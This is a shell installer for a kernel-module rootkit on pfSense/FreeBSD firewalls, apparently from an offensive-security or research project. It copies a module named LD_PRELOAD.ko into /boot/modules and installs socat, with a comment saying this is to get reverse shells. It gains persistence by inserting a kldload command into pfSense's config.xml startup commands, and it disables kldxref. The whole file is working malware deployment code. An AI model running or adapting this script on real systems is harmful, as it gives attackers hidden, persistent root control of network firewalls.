#!/bin/sh

if [ "$(id -u)" -ne 0 ]; then
   echo "Must be root to run this"
   exit 1
fi

# make writable
mount -o rw /

make

# mv LD_PRELOAD.ko LD_PRELOAD
LKM_NAME="LD_PRELOAD.ko"

# put the rootkit in the modules
cp "$LKM_NAME" /boot/modules/
# the version of nc (netcat) that comes with pfSense/FreeBSD doesn't allow for reverse shells
# therefore we get socat
pkg install socat -y

# achieve persistance by loading the module everytime the system boots
# cp ldpreload /usr/local/etc/rc.d/
# chmod +x /usr/local/etc/rc.d/ldpreload

# service ldpreload start

pkg install pfSense-pkg-shellcmd -y

CONFIG_FILE="/conf/config.xml"
MODULE_CMD="/bin/sh -c '/sbin/kldload /boot/modules/LD_PRELOAD.ko'"
TEMP_FILE="/tmp/config.xml"
# Backup the original config.xml
cp "$CONFIG_FILE" "/conf/config.xml.bak"
# Check if <shellcmd> section exists
if grep -q "<shellcmd>" "$CONFIG_FILE"; then
    # Append the command inside the existing <shellcmd> section
    sed "/<shellcmd>/a \\
        <command>$MODULE_CMD</command>" "$CONFIG_FILE" > "$TEMP_FILE"
else
    # Add a new <shellcmd> section before </pfsense>
    sed "/<\/pfsense>/i \\
    <shellcmd>\\
        <command>$MODULE_CMD</command>\\
    </shellcmd>" "$CONFIG_FILE" > "$TEMP_FILE"
fi
# Overwrite the original config.xml with the updated one
mv "$TEMP_FILE" "$CONFIG_FILE"
# Apply changes
/etc/rc.reload_all


# Disable kldxref by setting kldxref_enable="NO"
sed -i '' 's/^kldxref_enable="YES"/kldxref_enable="NO"/' /etc/rc.conf

# kldload "/Apekit-rootshit/$LKM_NAME"

# mkdir /boot/kernel/.ko_backup/

# cp "/Apekit-rootshit/$LKM_NAME" /boot/kernel/.ko_backup/